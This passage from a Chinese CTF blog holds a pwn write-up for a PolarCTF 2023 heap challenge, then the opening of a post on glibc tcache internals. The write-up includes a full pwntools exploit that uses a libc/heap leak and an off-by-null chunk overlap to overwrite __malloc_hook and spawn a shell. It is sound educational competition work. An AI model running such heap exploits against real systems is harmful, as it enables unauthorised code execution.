\x1B[0m&quot;</span>);</span><br><span class="line">      <span class="built_in">puts</span>(*(<span class="type">const</span> <span class="type">char</span> **)(qword_203080[i] + <span class="number">8LL</span>));</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;\x1B[1;33m ErrMsg \x1B[0m&quot;</span>);</span><br><span class="line">      <span class="built_in">puts</span>(*(<span class="type">const</span> <span class="type">char</span> **)(qword_203080[i] + <span class="number">24LL</span>));</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;\x1B[1;33m Mark \x1B[0m&quot;</span>);</span><br><span class="line">      <span class="built_in">puts</span>(*(<span class="type">const</span> <span class="type">char</span> **)(qword_203080[i] + <span class="number">16LL</span>));</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><code>sub_1005()</code>函数用于打印所有信息。这里菜名被标记为<code>ErrMsg</code>。</p>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>我们可以通过<code>sub_BFC()</code>函数未初始化的<code>ErrMsg(菜名)</code>和<code>sub_1005()</code>来进行信息泄露，得到<code>heap</code>和<code>libc</code>地址。然后利用<code>off-by-null</code>漏洞制造堆块重叠，向<code>fastbin</code>中写入<code>__malloc_hook</code>地址，然后篡改其为<code>one_gadget</code>来获取权限。</p>
<h3 id="前置脚本"><a href="#前置脚本" class="headerlink" title="前置脚本"></a>前置脚本</h3><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#context.log_level=&#x27;debug&#x27;</span></span><br><span class="line">context.log_level=<span class="string">&#x27;info&#x27;</span></span><br><span class="line">context.terminal=[<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">is_local = <span class="literal">False</span></span><br><span class="line">is_debug = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">connect</span>():</span><br><span class="line">	<span class="keyword">global</span> elf, libc, p</span><br><span class="line">	elf = ELF(<span class="string">&#x27;./562+5Liq5Yiw&#x27;</span>)</span><br><span class="line">	libc = ELF(<span class="string">&#x27;./libc-2.23.so&#x27;</span>)</span><br><span class="line">	<span class="keyword">if</span> is_local:</span><br><span class="line">		p = process(<span class="string">&#x27;./562+5Liq5Yiw&#x27;</span>)</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		p = remote(<span class="string">&#x27;IP&#x27;</span>, port)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>(<span class="params">gdbscript=<span class="string">&quot;&quot;</span></span>):</span><br><span class="line">    <span class="keyword">if</span> is_debug:</span><br><span class="line">        gdb.attach(p, gdbscript=gdbscript)</span><br><span class="line">        pause()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Add</span>(<span class="params">size, data, mark</span>):</span><br><span class="line">	p.recvuntil(<span class="string">b&quot;5.EXIT.\n&quot;</span>)</span><br><span class="line">	p.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">	p.recvuntil(<span class="string">b&quot;\x1B[1;33m Give me the size of the chicken. \x1B[0m\n&quot;</span>)</span><br><span class="line">	p.sendline(<span class="built_in">str</span>(size).encode())</span><br><span class="line">	p.recvuntil(<span class="string">b&quot;\x1B[1;33m Give me the name of the chicken. \x1B[0m\n&quot;</span>)</span><br><span class="line">	p.send(data)</span><br><span class="line">	p.recvuntil(<span class="string">b&quot;\x1B[1;33m Give the chicken a mark. \x1B[0m\n&quot;</span>)</span><br><span class="line">	p.send(mark)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Delete</span>(<span class="params">idx</span>):</span><br><span class="line">	p.recvuntil(<span class="string">b&quot;5.EXIT.\n&quot;</span>)</span><br><span class="line">	p.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">	p.recvuntil(<span class="string">b&quot;\x1B[1;33m Which chicken will you kill? \x1B[0m\n&quot;</span>)</span><br><span class="line">	p.sendline(<span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Cook</span>(<span class="params">idx, name, cook</span>):</span><br><span class="line">	p.recvuntil(<span class="string">b&quot;5.EXIT.\n&quot;</span>)</span><br><span class="line">	p.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">	p.recvuntil(<span class="string">b&quot;\x1B[1;33m Which chicken will you cook? \x1B[0m\n&quot;</span>)</span><br><span class="line">	p.sendline(<span class="built_in">str</span>(idx).encode())</span><br><span class="line">	p.recvuntil(<span class="string">b&quot;Give me new name.\n&quot;</span>)</span><br><span class="line">	p.send(name)</span><br><span class="line">	p.recvuntil(<span class="string">b&quot;Give me Cook name.\n&quot;</span>)</span><br><span class="line">	p.send(cook)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Black</span>():</span><br><span class="line">	p.recvuntil(<span class="string">b&quot;5.EXIT.\n&quot;</span>)</span><br><span class="line">	p.sendline(<span class="string">b&#x27;4&#x27;</span>)</span><br></pre></td></tr></table></figure></div>

<p>定义了函数接口和前置操作。</p>
<h3 id="泄露libc地址"><a href="#泄露libc地址" class="headerlink" title="泄露libc地址"></a>泄露libc地址</h3><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">get_libc</span>():</span><br><span class="line">	<span class="keyword">global</span> __malloc_hook, libc_base</span><br><span class="line">	Add(<span class="number">0x20</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">20</span>, <span class="string">b&#x27;b&#x27;</span>*<span class="number">20</span>)</span><br><span class="line">	Delete(<span class="number">0</span>)</span><br><span class="line">	Add(<span class="number">0x20</span>, <span class="string">b&#x27;c&#x27;</span>*<span class="number">20</span>, <span class="string">b&#x27;d&#x27;</span>*<span class="number">20</span>)</span><br><span class="line">	Black()</span><br><span class="line">	p.recvuntil(<span class="string">b&quot;0\n&quot;</span>)</span><br><span class="line">	p.recvuntil(<span class="string">b&quot;\x1B[1;33m ErrMsg \x1B[0m\n&quot;</span>)</span><br><span class="line">	libc_base = u64(p.recvline()[:-<span class="number">1</span>].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x3c4b78</span></span><br><span class="line">	log.success(<span class="string">&quot;libc : 0x%x&quot;</span> % libc_base)</span><br><span class="line">	__malloc_hook = libc_base + libc.symbols[<span class="string">&quot;__malloc_hook&quot;</span>]</span><br></pre></td></tr></table></figure></div>

<p>本题泄露利用<code>unsorted bin</code>中保存的<code>libc</code>地址与<code>libc</code>基址的固定偏移获取<code>libc</code>基址。因为结构体在初始化时并未初始化<code>ErrMsg</code>的值，并且其大小为<code>0x90</code>，我们申请一个结构体再将其释放，再次申请时可将其从<code>unsorted bin</code>中申请出来，然后可以通过打印函数打印<code>unsorted bin</code>中的内容。</p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/24/PolarCTF-2023%E7%A7%8B%E8%B5%9B-%E5%A4%95%E9%98%B3%E4%B8%8B%E7%9A%84%E8%88%9E%E8%80%85/image-20230911185916169.png"
                      alt="image-20230911185916169"
                ></p>
<p>在打印前下断点可以看到，此时<code>ErrMsg</code>中保存的值为<code>libc</code>地址。由于<code>libc</code>中的地址固定偏移不受<code>pie</code>和<code>aslr</code>保护影响，可以由此计算出<code>libc</code>基址。</p>
<h3 id="泄露heap地址"><a href="#泄露heap地址" class="headerlink" title="泄露heap地址"></a>泄露heap地址</h3><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">get_heap</span>():</span><br><span class="line">	<span class="keyword">global</span> heap_addr</span><br><span class="line">	Add(<span class="number">0x80</span>, <span class="string">b&#x27;e&#x27;</span>*<span class="number">0x20</span>, <span class="string">b&#x27;f&#x27;</span>*<span class="number">0x10</span>) <span class="comment"># 1</span></span><br><span class="line">	Add(<span class="number">0x80</span>, <span class="string">b&#x27;g&#x27;</span>*<span class="number">0x20</span>, <span class="string">b&#x27;h&#x27;</span>*<span class="number">0x10</span>) <span class="comment"># 2</span></span><br><span class="line">	Add(<span class="number">0x80</span>, <span class="string">b&#x27;i&#x27;</span>*<span class="number">0x20</span>, <span class="string">b&#x27;j&#x27;</span>*<span class="number">0x10</span>) <span class="comment"># 3</span></span><br><span class="line"></span><br><span class="line">	Delete(<span class="number">1</span>)</span><br><span class="line">	Delete(<span class="number">3</span>)</span><br><span class="line">	Add(<span class="number">0x20</span>, <span class="string">b&#x27;i&#x27;</span>*<span class="number">0x20</span>, <span class="string">b&#x27;j&#x27;</span>*<span class="number">0x10</span>) <span class="comment"># 1</span></span><br><span class="line">	Cook(<span class="number">1</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>, <span class="string">b&#x27;cccccccn&#x27;</span>);</span><br><span class="line">	Black()</span><br><span class="line">	p.recvuntil(<span class="string">b&quot;1\n&quot;</span>)</span><br><span class="line">	p.recvuntil(<span class="string">b&quot;\x1B[1;33m ErrMsg \x1B[0m\n&quot;</span>)</span><br><span class="line">	p.recvuntil(<span class="string">b&#x27;cccccccn&#x27;</span>)</span><br><span class="line">	heap_addr = u64(p.recvline()[:-<span class="number">1</span>].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">	log.success(<span class="string">&quot;heap : 0x%x&quot;</span> % heap_addr)</span><br></pre></td></tr></table></figure></div>

<p>堆地址也可以通过<code>unsorted bin</code>的<code>bk</code>指针泄露，我们将两个不连续的<code>non-fast</code>大小的堆块放入<code>unsorted bin</code>中，由于<code>unsorted bin</code>采取先进先出模式，所以我们会将<code>结构体1</code>重新申请出来，它<code>ErrMsg</code>的<code>bk</code>位置便是<code>结构体3</code>的地址。然后通过改名函数将<code>ErrMsg</code>的前八个字节覆盖满，然后便可通过打印函数将堆地址泄露。</p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/24/PolarCTF-2023%E7%A7%8B%E8%B5%9B-%E5%A4%95%E9%98%B3%E4%B8%8B%E7%9A%84%E8%88%9E%E8%80%85/image-20230911191326440.png"
                      alt="image-20230911191326440"
                ></p>
<p>同样在打印前下一个断点，可以看到其<code>bk</code>位置为一个堆地址。</p>
<h3 id="通过修改-malloc-hook为one-gadget地址get-shell"><a href="#通过修改-malloc-hook为one-gadget地址get-shell" class="headerlink" title="通过修改__malloc_hook为one_gadget地址get_shell"></a>通过修改__malloc_hook为one_gadget地址get_shell</h3><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">get_shell</span>():</span><br><span class="line">	Add(<span class="number">0x80</span>, <span class="string">b&#x27;i&#x27;</span>*<span class="number">0x20</span>, <span class="string">b&#x27;j&#x27;</span>*<span class="number">0x10</span>) <span class="comment"># 3</span></span><br><span class="line">	Add(<span class="number">0x60</span>, p64(<span class="number">0</span>) + p64(<span class="number">0x320</span>) + p64(heap_addr+<span class="number">0x190</span>) + p64(heap_addr+<span class="number">0x190</span>), <span class="string">b&#x27;b&#x27;</span>*<span class="number">0x10</span>) <span class="comment"># 4</span></span><br><span class="line">	Add(<span class="number">0x60</span>, <span class="string">b&#x27;c&#x27;</span>*<span class="number">0x10</span>, <span class="string">b&#x27;d&#x27;</span>*<span class="number">0x10</span>) <span class="comment"># 5</span></span><br><span class="line">	Add(<span class="number">0x60</span>, <span class="string">b&#x27;e&#x27;</span>*<span class="number">0x10</span>, <span class="string">b&#x27;f&#x27;</span>*<span class="number">0x10</span>) <span class="comment"># 6</span></span><br><span class="line">	Add(<span class="number">0x60</span>, <span class="string">b&#x27;h&#x27;</span>*<span class="number">0x10</span>, <span class="string">b&#x27;j&#x27;</span>*<span class="number">0x10</span>) <span class="comment"># 7</span></span><br><span class="line">	Delete(<span class="number">6</span>)</span><br><span class="line">	Add(<span class="number">0x68</span>, <span class="string">b&#x27;k&#x27;</span>*<span class="number">0x60</span> + p64(<span class="number">0x320</span>), <span class="string">b&#x27;j&#x27;</span>*<span class="number">0x10</span>) <span class="comment"># 6</span></span><br><span class="line">	Delete(<span class="number">6</span>)</span><br><span class="line">	Add(<span class="number">0x2D0</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x2A0</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x71</span>) + p64(__malloc_hook-<span class="number">0x23</span>) + p64(<span class="number">0xdeadbeef</span>), <span class="string">b&#x27;b&#x27;</span>*<span class="number">0x10</span>) <span class="comment"># 6</span></span><br><span class="line">	Delete(<span class="number">0</span>)</span><br><span class="line">	Delete(<span class="number">1</span>)</span><br><span class="line">	Delete(<span class="number">2</span>)</span><br><span class="line">	Add(<span class="number">0x60</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>, <span class="string">b&#x27;b&#x27;</span>*<span class="number">0x10</span>) <span class="comment"># 0</span></span><br><span class="line">	one = [<span class="number">0x45226</span>, <span class="number">0x4527a</span>, <span class="number">0xf03a4</span>, <span class="number">0xf1247</span>]</span><br><span class="line">	Add(<span class="number">0x60</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x13</span>+p64(libc_base+one[<span class="number">1</span>]), <span class="string">b&#x27;c&#x27;</span>*<span class="number">0x10</span>) <span class="comment"># 1</span></span><br><span class="line">	Delete(<span class="number">4</span>)</span><br></pre></td></tr></table></figure></div>

<p>因为<code>Add</code>函数存在<code>off-by-null</code>漏洞，所以我们可以制造一个堆块重叠，将一个<code>fast chunk</code>包含在其中，这里需要注意的时，我们要绕过<code>unlink</code>检查，需要将伪造的<code>fake chunk</code>的<code>fd</code>和<code>bk</code>指向它本身。然后计算好偏移将<code>fast chunk</code>的<code>fd</code>位置改为<code>__malloc_hook</code>附近包含<code>__malloc_hook</code>大小的<code>fake chunk</code>的位置。然后将<code>__malloc_hook</code>改为<code>one_gadget</code>。此时四个<code>one_gadget</code>都无法打通，我们可以<code>free</code>一个错误的<code>chunk</code>来调用<code>malloc_printerr</code>函数，这个函数中存在其他的调用，最后会调用到<code>malloc</code>，然后便可调用<code>one_gadget</code>。</p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/24/PolarCTF-2023%E7%A7%8B%E8%B5%9B-%E5%A4%95%E9%98%B3%E4%B8%8B%E7%9A%84%E8%88%9E%E8%80%85/image-20230911193221372.png"
                      alt="image-20230911193221372"
                ></p>
<p>通过<code>find_fake_fast</code>来寻找<code>__malloc_hook</code>附近的<code>fake_chunk</code>。<code>fake_chunk</code>的<code>prev_size</code>距离<code>__malloc_hook</code>有0x23大小。所以填充<code>0x13</code>字节即可覆盖到目标地址。</p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/24/PolarCTF-2023%E7%A7%8B%E8%B5%9B-%E5%A4%95%E9%98%B3%E4%B8%8B%E7%9A%84%E8%88%9E%E8%80%85/image-20230911193629573.png"
                      alt="image-20230911193629573"
                ></p>
<p>我们可以通过<code>k</code>来查看函数调用栈，发现<code>free</code>报错后会在动态链接器调用<code>malloc</code>。</p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/24/PolarCTF-2023%E7%A7%8B%E8%B5%9B-%E5%A4%95%E9%98%B3%E4%B8%8B%E7%9A%84%E8%88%9E%E8%80%85/image-20230911194307830.png"
                      alt="image-20230911194307830"
                ></p>
<p>可以在源码中发现，由于<code>free</code>一个错误堆块调用了<code>malloc_printerr</code>函数，最后在<code>dl-error.c</code>调用了<code>malloc</code>函数。</p>
<h2 id="完整exp"><a href="#完整exp" class="headerlink" title="完整exp"></a>完整exp</h2><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#context.log_level=&#x27;debug&#x27;</span></span><br><span class="line">context.log_level=<span class="string">&#x27;info&#x27;</span></span><br><span class="line">context.terminal=[<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">is_debug = <span class="literal">False</span></span><br><span class="line">is_local = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">connect</span>():</span><br><span class="line">	<span class="keyword">global</span> elf, libc, p</span><br><span class="line">	elf = ELF(<span class="string">&#x27;./562+5Liq5Yiw&#x27;</span>)</span><br><span class="line">	libc = ELF(<span class="string">&#x27;./libc-2.23.so&#x27;</span>)</span><br><span class="line">	<span class="keyword">if</span> is_local:</span><br><span class="line">		p = process(<span class="string">&#x27;./562+5Liq5Yiw&#x27;</span>)</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		p = remote(<span class="string">&#x27;IP&#x27;</span>, port)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>(<span class="params">gdbscript=<span class="string">&quot;&quot;</span></span>):</span><br><span class="line">    <span class="keyword">if</span> is_debug:</span><br><span class="line">        gdb.attach(p, gdbscript=gdbscript)</span><br><span class="line">        pause()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Add</span>(<span class="params">size, data, mark</span>):</span><br><span class="line">	p.recvuntil(<span class="string">b&quot;5.EXIT.\n&quot;</span>)</span><br><span class="line">	p.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">	p.recvuntil(<span class="string">b&quot;\x1B[1;33m Give me the size of the chicken. \x1B[0m\n&quot;</span>)</span><br><span class="line">	p.sendline(<span class="built_in">str</span>(size).encode())</span><br><span class="line">	p.recvuntil(<span class="string">b&quot;\x1B[1;33m Give me the name of the chicken. \x1B[0m\n&quot;</span>)</span><br><span class="line">	p.send(data)</span><br><span class="line">	p.recvuntil(<span class="string">b&quot;\x1B[1;33m Give the chicken a mark. \x1B[0m\n&quot;</span>)</span><br><span class="line">	p.send(mark)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Delete</span>(<span class="params">idx</span>):</span><br><span class="line">	p.recvuntil(<span class="string">b&quot;5.EXIT.\n&quot;</span>)</span><br><span class="line">	p.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">	p.recvuntil(<span class="string">b&quot;\x1B[1;33m Which chicken will you kill? \x1B[0m\n&quot;</span>)</span><br><span class="line">	p.sendline(<span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Cook</span>(<span class="params">idx, name, cook</span>):</span><br><span class="line">	p.recvuntil(<span class="string">b&quot;5.EXIT.\n&quot;</span>)</span><br><span class="line">	p.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">	p.recvuntil(<span class="string">b&quot;\x1B[1;33m Which chicken will you cook? \x1B[0m\n&quot;</span>)</span><br><span class="line">	p.sendline(<span class="built_in">str</span>(idx).encode())</span><br><span class="line">	p.recvuntil(<span class="string">b&quot;Give me new name.\n&quot;</span>)</span><br><span class="line">	p.send(name)</span><br><span class="line">	p.recvuntil(<span class="string">b&quot;Give me Cook name.\n&quot;</span>)</span><br><span class="line">	p.send(cook)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Black</span>():</span><br><span class="line">	p.recvuntil(<span class="string">b&quot;5.EXIT.\n&quot;</span>)</span><br><span class="line">	p.sendline(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_libc</span>():</span><br><span class="line">	<span class="keyword">global</span> __malloc_hook, libc_base</span><br><span class="line">	Add(<span class="number">0x20</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">20</span>, <span class="string">b&#x27;b&#x27;</span>*<span class="number">20</span>) <span class="comment"># 0 errmsg_0x90-&gt;unsorted</span></span><br><span class="line">	Delete(<span class="number">0</span>) <span class="comment"># errmsg_0x90-&gt;unsorted</span></span><br><span class="line">	Add(<span class="number">0x20</span>, <span class="string">b&#x27;c&#x27;</span>*<span class="number">20</span>, <span class="string">b&#x27;d&#x27;</span>*<span class="number">20</span>) <span class="comment"># 0 # unsorted-&gt;errmsg_0x90</span></span><br><span class="line">	Black()</span><br><span class="line">	<span class="comment">#debug() # db1</span></span><br><span class="line">	p.recvuntil(<span class="string">b&quot;0\n&quot;</span>)</span><br><span class="line">	p.recvuntil(<span class="string">b&quot;\x1B[1;33m ErrMsg \x1B[0m\n&quot;</span>)</span><br><span class="line">	libc_base = u64(p.recvline()[:-<span class="number">1</span>].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">0x3c4b78</span></span><br><span class="line">	log.success(<span class="string">&quot;libc : 0x%x&quot;</span> % libc_base)</span><br><span class="line">	__malloc_hook = libc_base + libc.symbols[<span class="string">&quot;__malloc_hook&quot;</span>]</span><br><span class="line">	sleep(<span class="number">0.5</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_heap</span>():</span><br><span class="line">	<span class="keyword">global</span> heap_addr</span><br><span class="line">	Add(<span class="number">0x80</span>, <span class="string">b&#x27;e&#x27;</span>*<span class="number">0x20</span>, <span class="string">b&#x27;f&#x27;</span>*<span class="number">0x10</span>) <span class="comment"># 1</span></span><br><span class="line">	Add(<span class="number">0x80</span>, <span class="string">b&#x27;g&#x27;</span>*<span class="number">0x20</span>, <span class="string">b&#x27;h&#x27;</span>*<span class="number">0x10</span>) <span class="comment"># 2</span></span><br><span class="line">	Add(<span class="number">0x80</span>, <span class="string">b&#x27;i&#x27;</span>*<span class="number">0x20</span>, <span class="string">b&#x27;j&#x27;</span>*<span class="number">0x10</span>) <span class="comment"># 3</span></span><br><span class="line">	Delete(<span class="number">1</span>)</span><br><span class="line">	Delete(<span class="number">3</span>)</span><br><span class="line">	<span class="comment">#debug() # db2</span></span><br><span class="line">	Add(<span class="number">0x20</span>, <span class="string">b&#x27;i&#x27;</span>*<span class="number">0x20</span>, <span class="string">b&#x27;j&#x27;</span>*<span class="number">0x10</span>) <span class="comment"># 1</span></span><br><span class="line">	Cook(<span class="number">1</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>, <span class="string">b&#x27;cccccccn&#x27;</span>)</span><br><span class="line">	Black()</span><br><span class="line">	<span class="comment">#debug() # db3</span></span><br><span class="line">	p.recvuntil(<span class="string">b&quot;1\n&quot;</span>)</span><br><span class="line">	p.recvuntil(<span class="string">b&quot;\x1B[1;33m ErrMsg \x1B[0m\n&quot;</span>)</span><br><span class="line">	p.recvuntil(<span class="string">b&#x27;cccccccn&#x27;</span>)</span><br><span class="line">	heap_addr = u64(p.recvline()[:-<span class="number">1</span>].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">	log.success(<span class="string">&quot;heap : 0x%x&quot;</span> % heap_addr)</span><br><span class="line">	sleep(<span class="number">0.5</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_shell</span>():</span><br><span class="line">	Add(<span class="number">0x80</span>, <span class="string">b&#x27;i&#x27;</span>*<span class="number">0x20</span>, <span class="string">b&#x27;j&#x27;</span>*<span class="number">0x10</span>) <span class="comment"># 3</span></span><br><span class="line">	Add(<span class="number">0x60</span>, p64(<span class="number">0</span>) + p64(<span class="number">0x320</span>) + p64(heap_addr+<span class="number">0x190</span>) + p64(heap_addr+<span class="number">0x190</span>), <span class="string">b&#x27;b&#x27;</span>*<span class="number">0x10</span>) <span class="comment"># 4 first 0x71</span></span><br><span class="line">	Add(<span class="number">0x60</span>, <span class="string">b&#x27;c&#x27;</span>*<span class="number">0x10</span>, <span class="string">b&#x27;d&#x27;</span>*<span class="number">0x10</span>) <span class="comment"># 5</span></span><br><span class="line">	Add(<span class="number">0x60</span>, <span class="string">b&#x27;e&#x27;</span>*<span class="number">0x10</span>, <span class="string">b&#x27;f&#x27;</span>*<span class="number">0x10</span>) <span class="comment"># 6</span></span><br><span class="line">	Add(<span class="number">0x60</span>, <span class="string">b&#x27;h&#x27;</span>*<span class="number">0x10</span>, <span class="string">b&#x27;j&#x27;</span>*<span class="number">0x10</span>) <span class="comment"># 7</span></span><br><span class="line">	<span class="comment">#debug() # db4</span></span><br><span class="line">	Delete(<span class="number">6</span>)</span><br><span class="line">	<span class="comment">#debug() # db5</span></span><br><span class="line">	Add(<span class="number">0x68</span>, <span class="string">b&#x27;k&#x27;</span>*<span class="number">0x60</span> + p64(<span class="number">0x320</span>), <span class="string">b&#x27;j&#x27;</span>*<span class="number">0x10</span>) <span class="comment"># 6 off-by-null</span></span><br><span class="line">	<span class="comment">#debug() # db6</span></span><br><span class="line">	Delete(<span class="number">6</span>)</span><br><span class="line">	<span class="comment">#debug() # db7</span></span><br><span class="line">	Add(<span class="number">0x2D0</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x2A0</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x71</span>) + p64(__malloc_hook-<span class="number">0x23</span>) + p64(<span class="number">0xdeadbeef</span>), <span class="string">b&#x27;b&#x27;</span>*<span class="number">0x10</span>) <span class="comment"># 6</span></span><br><span class="line">	<span class="comment">#debug() # db8</span></span><br><span class="line">	Delete(<span class="number">0</span>)</span><br><span class="line">	Delete(<span class="number">1</span>)</span><br><span class="line">	Delete(<span class="number">2</span>)</span><br><span class="line">	Add(<span class="number">0x60</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>, <span class="string">b&#x27;b&#x27;</span>*<span class="number">0x10</span>) <span class="comment"># 0</span></span><br><span class="line">	one = [<span class="number">0x45226</span>, <span class="number">0x4527a</span>, <span class="number">0xf03a4</span>, <span class="number">0xf1247</span>]</span><br><span class="line">	Add(<span class="number">0x60</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x13</span>+p64(libc_base+one[<span class="number">1</span>]), <span class="string">b&#x27;c&#x27;</span>*<span class="number">0x10</span>) <span class="comment"># 1</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">#gdb.attach(p, &#x27;b *_dl_signal_error&#x27;)</span></span><br><span class="line">	Delete(<span class="number">4</span>)</span><br><span class="line">	<span class="comment">#pause()</span></span><br><span class="line">	sleep(<span class="number">0.5</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pwn</span>():</span><br><span class="line">	connect()</span><br><span class="line">	get_libc()</span><br><span class="line">	get_heap()</span><br><span class="line">	get_shell()</span><br><span class="line">	p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">	pwn()</span><br></pre></td></tr></table></figure></div>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>Pwn题解</tag>
      </tags>
  </entry>
  <entry>
    <title>Tcache安全机制及赛题详细解析</title>
    <url>/2023/09/22/Tcache%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/</url>
    <content><![CDATA[<h1 id="Tcache简介"><a href="#Tcache简介" class="headerlink" title="Tcache简介"></a>Tcache简介</h1><p><a class="link"   href="https://elixir.bootlin.com/glibc/glibc-2.26/source/malloc/malloc.c" >glibc 源码网址 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>  ptmallloc2在libc2.26中引入了Tcache这种无需对arena上锁就可以使用的小堆块。<strong>tcache是单链表结构</strong>，每条链上最多可以有 <strong>7</strong> 个 chunk，free 的时候当对应的 tcache bin 满了才放入fastbin，unsorted bin，malloc的时候优先去tcache bin找。</p>
<p>其数据结构如下。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">#if USE_TCACHE</span><br><span class="line">/* 最大64个bins */</span><br><span class="line">#define TCACHE_MAX_BINS 64  </span><br><span class="line">#define MAX_TCACHE_SIZE tidx2usize (TCACHE_MAX_BINS-1)</span><br><span class="line">#define tidx2usize(idx)    (((size_t) idx) * MALLOC_ALIGNMENT + MINSIZE - SIZE_SZ)</span><br><span class="line">#define csize2tidx(x) (((x) - MINSIZE + MALLOC_ALIGNMENT - 1) / MALLOC_ALIGNMENT)</span><br><span class="line">#define usize2tidx(x) csize2tidx (request2size (x))</span><br><span class="line">/* 每个bins最多缓存7个chunk */</span><br><span class="line">#define TCACHE_FILL_COUNT 7</span><br><span class="line">#endif</span><br><span class="line"></span><br><span class="line">typedef struct tcache_entry &#123;</span><br><span class="line">  struct tcache_entry *next;</span><br><span class="line">&#125; tcache_entry;</span><br><span class="line"> /*</span><br><span class="line"> *  tcache_entry 用于链接空闲的 chunk 结构体，其中的 next 指针指向下一个大小相同的 